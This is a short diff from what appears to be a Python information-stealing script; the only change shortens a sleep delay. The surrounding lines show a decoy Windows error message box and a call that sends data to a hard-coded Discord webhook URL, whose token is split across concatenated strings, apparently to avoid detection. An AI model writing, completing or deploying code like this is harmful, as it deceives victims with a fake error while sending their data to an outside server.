@@ -35,7 +35,7 @@ def main(webhook):
 if __name__ == '__main__':
     main(__CONFIG__['webhook'])
     ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
-    sleep(7)
+    sleep(6)
     try:
         main('https://discord.com/api/webhooks/1066536487065227425/3bQPU'+'GH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
     except:
